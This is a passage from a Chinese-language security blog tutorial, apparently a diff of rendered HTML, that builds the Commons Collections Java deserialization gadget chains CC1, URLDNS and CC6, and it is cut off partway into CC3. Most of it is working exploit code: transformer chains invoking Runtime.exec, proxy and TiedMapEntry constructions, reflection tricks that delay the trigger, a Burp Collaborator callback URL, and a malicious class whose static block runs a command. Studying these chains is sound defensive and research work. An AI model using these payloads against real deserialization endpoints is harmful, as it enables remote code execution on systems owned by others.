+<p>所以我们通过代理对象调用方法时就得调用一个无参方法就可以完成整条链，发现在readObject方法中调用了map的一个无参方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113145548023.png" class="">
+
+<p>思路：通过代理这个map，当它调用了entrySet方法时，就去进入到annotationInvocationHandler类中的invoke，然后invoke就会去调用LazyMap的get方法，此时整条链就连起来了，只能说非常巧妙。</p>
+<p>这个时候还需要理清，需要被反序列化的annotationInvocationHandler（这里记为a1），它的memberValues是一个代理的map，当我们调用它的entrySet方法就会触发代理的invoke方法，然后代理的类还是annotationInvocationHandler（记为a2）这个类，它通过invoke就会去调用get方法，此时a2里面的memberValues就是LazyMap，然后里面通过transform去调用整条链。</p>
+<h3 id="2、链成"><a href="#2、链成" class="headerlink" title="2、链成"></a>2、链成</h3><p>理清了逻辑之后，直接开始写代码。</p>
+<p>首先构造LazyMap的起始链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line">    map.get(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>能够成功，那么再构造一个动态代理的annotationInvocationHandler。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//这是代理处理器</span></span><br><span class="line">    InvocationHandler proxyHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line">    Map proxyObj = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, proxyHandler);</span><br><span class="line">    proxyObj.entrySet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再创建一个AnnotationInvocationHandler，用于反序列化，最终成链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//这是代理处理器</span></span><br><span class="line">    InvocationHandler proxyHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line">    Map proxyObj = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, proxyHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需要反序列化的对象</span></span><br><span class="line">    Object o = constructor.newInstance(Retention.class, proxyObj);</span><br><span class="line">    <span class="comment">//自己封装的序列化以及反序列化</span></span><br><span class="line">    MySerUtils.writeObject(o);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二条链的流程：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113151805508.png" class="">
+
+<h3 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h3><p>两条CC1链需要jdk8u71以前，以及CommonsCollections版本为3.2.1，条件很约束。</p>
+<p>在jdk8u71即以后，它重构了AnnotationInvocationHandler的实现，导致CC1无法利用。</p>
+<h2 id="4）CC6链"><a href="#4）CC6链" class="headerlink" title="4）CC6链"></a>4）CC6链</h2><h3 id="1、URL链"><a href="#1、URL链" class="headerlink" title="1、URL链"></a>1、URL链</h3><p>了解CC6链之前，先了解一下URL链。</p>
+<p>URL链一般都用作poc，只需要观察是否有请求即可。</p>
+<p>URL链的核心是URL+Map。</p>
+<blockquote>
+<p>HashMap</p>
+</blockquote>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172220131.png" class="">
+
+<p>在HashMap中的readObject方法会将键值对反序列化过来，并且key会的hash会重新计算，调用hash方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172320968.png" class="">
+
+<p>而这个hash方法的实现会调用这个对象的hashCode方法。</p>
+<blockquote>
+<p>URL</p>
+</blockquote>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172434616.png" class="">
+
+<p>在URL类中，它的hashCode方法是先判断，然后调用URLStreamHandler这个类的hashCode方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113172546274.png" class="">
+
+<p>而这个类在调用hashcode方法时，获取请求一下该地址。</p>
+<p>并且URL类还是可以序列化的，此时一条链就诞生了。</p>
+<blockquote>
+<p>链实现</p>
+</blockquote>
+<p>通过dnslog或者burpsuite（Burp -&gt; Burp Collaborator client）生成一个url地址给我们访问。</p>
+<p>构造链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    HashMap&lt;URL, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://828fzsmywe11j676l99mayvrnit8hx.burpcollaborator.net&quot;</span>);</span><br><span class="line">    hashMap.put(url,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(hashMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现了一个问题：我们在序列化的时候就已经去请求了，而在反序列时却没有请求。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113173204630.png" class="">
+
+<p>通过调试发现，hashMap在put的时候已经去调用了hash方法。而在hashMap中的源码我们肯定无法修改，然后就想到了URL的hashCode方法，它有一个判断，如果hashCode的值不为-1那么就直接返回，为-1再去计算才会。hashCode默认值为-1，一开始我们在hashMap中放入数据，此时就会去请求URL，然后hashCode的值被修改，接着序列化，然后反序列化，此时拿到的hashCode值不为-1，就不会去计算了，就没有请求了！</p>
+<p>知道原因之后，我们使用反射去修改hashCode的值，最终链成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    HashMap&lt;URL, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://2qtjdxd1i7cbbx7v6b9861o1lsrif7.burpcollaborator.net&quot;</span>);</span><br><span class="line">    Field hashCode = URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//放入之前修改hashCode的值</span></span><br><span class="line">    hashCode.set(url, <span class="number">7</span>);</span><br><span class="line">    hashMap.put(url,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">//放入之后再次修改hashCode的值</span></span><br><span class="line">    hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(hashMap);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、CC6链"><a href="#2、CC6链" class="headerlink" title="2、CC6链"></a>2、CC6链</h3><p>为了解决CC1链版本限制的问题，所以找到了一条链。</p>
+<p>在URL那条链中，我们知道hashMap的readObject方法会调用put，在put的时候会去调用key的hashcode方法，那我们可以找是否有一个类，它的hashCode方法是调用了LazyMap的get并且这个类的参数还是可控的，发现有个类<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>满足条件！</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113202553501.png" class="">
+
+<p>它的hashCode会调用getValue方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113202611426.png" class="">
+
+<p>而getValue是调用了map.get方法，此时我们使map变为LazyMap即可构成链。</p>
+<blockquote>
+<p>初步成型</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(map, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(hashMap);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这个代码还是和URL那条链一样，有个问题：在put的时候，会调用该key的hashcode方法，导致直接执行了那条链。所以我们可以修改元素的值，达到不触发链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	方式一：重设tiedMapEntry的key值</span></span><br><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(<span class="keyword">new</span> HashMap&lt;Object,Object&gt;(), <span class="string">&quot;&quot;</span>); <span class="comment">//tiedMapEntry赋值为其他的</span></span><br><span class="line">Field keyField = TiedMapEntry.class.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(tiedMapEntry,map);</span><br><span class="line"></span><br><span class="line"><span class="comment">//	方式二：重设LazyMap的factory值</span></span><br><span class="line">Map map = LazyMap.decorate(lzMap, <span class="keyword">new</span> ConstantTransformer(<span class="string">&quot;&quot;</span>)); <span class="comment">//lazyMap赋值为其他的</span></span><br><span class="line">Field factoryField = LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">factoryField.set(map,chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终成链</p>
+</blockquote>
+<p>但是此时又有一个问题，那就是在反序列化时不会调用链了。</p>
+<p>问题所在：不要忘了，LazyMap是一个懒加载的Map，所以他在存储键值对时，第一次如果key不存在才会调用链，以后就是直接返回了。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113205345886.png" class="">
+
+<p>第一次在hashMap调用put的时候，就会走到这儿，此时是<code>ConstantTransformer</code>进行调用链了，下一次在进行调用时，已经有了这个key，就不会去调用了。</p>
+<p>解决方法：关键就是存有了那个key，我们直接将其删除即可，下一次就没有了，就得再次加载。</p>
+<p>最终成链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, <span class="keyword">new</span> ConstantTransformer(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(map, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="comment">//删除key</span></span><br><span class="line">    map.remove(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="comment">//重设LazyMap的factory值</span></span><br><span class="line">    Field factoryField = LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    factoryField.set(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(hashMap);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用图：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113210016248.png" class="">
+
+<p>特点：不受jdk版本的限制。</p>
+<p>调用链：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113224840178.png" class="">
+
+<h2 id="5）CC3链"><a href="#5）CC3链" class="headerlink" title="5）CC3链"></a>5）CC3链</h2><h3 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h3><p>CC3链是为了解决敏感函数调用的问题，最后都会调用Runtime.exec并且还只能任意命令执行，所以有大佬就研究出来了通过动态加载类这条链、</p>
+<p>前面学习过，都是调用ClassLoader中的defineClass方法，利用调用查找，发现<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader</code>这个类中defineClass方法调用了，再往上找<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类中的defineTransletClasses方法是调用者，然后再往上发现了3处调用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230652364.png" class="">
+
+<p>这里要做出筛选了，因为我们知道，加载了类是不会进行初始化的，想要调用我们的静态代码块，就得进行newInstance。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230848575.png" class="">
+
+<p>成功发现在这一处调用时进行了初始化，发现这个方法是私有方法，就再往上找。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113230956346.png" class="">
+
+<p>找到了一处公有的方法调用了它，我们就可以开始构造初步的链了。</p>
+<blockquote>
+<p>研究类属性</p>
+</blockquote>
+<p>首先这个类是有默认构造的，所以可以直接new，然后该方法也没有参数，可以直接调用。</p>
+<p>接着跟着调用顺序看，哪些属性是要赋值的。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113231308270.png" class="">
+
+<p>发现了2个条件，首先_name的值一定不能为空，否则方法就退出了，_class的值也必须为空，因为我们需要它调用这个方法来进行class加载。</p>
+<p>再接着走进<code>defineTransletClasses</code>方法，发现判断了_bytecodes</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232116527.png" class="">
+
+<p>并且还发现调用了_tfactory的方法，所以也得初始化。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113231702688.png" class="">
+
+<blockquote>
+<p>研究类赋值</p>
+</blockquote>
+<p>首先_name变量，在后面没有利用到，所以随便赋值，并且可以序列化（如果无法序列化，那么反序列化之后也会没有值）</p>
+<p>然后就是_class变量，他默认值是null，那么就不用动他。</p>
+<p>接着就是_bytecodes变量，它是<code>byte[][] _bytecodes</code>类型的，可序列化。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232414140.png" class="">
+
+<p>通过源码获取到，它是遍历这个数组，然后去加载每一个元素（byte[]），所以这里就写我们对应的class文件的值即可。</p>
+<p>最后就是_tfactory，发现它有关键字transient修饰，说明无法进行序列化，就算我们赋值了也没用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232551037.png" class="">
+
+<p>但是在readObject方法中发现了它的初始化，也就是进行反序列化时，它会自动赋值，解决了我们的问题。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113232754925.png" class="">
+
+<h3 id="2、前奏"><a href="#2、前奏" class="headerlink" title="2、前奏"></a>2、前奏</h3><p>通过分析，创建一条初步的链，攻击代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyExp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击链：</p>
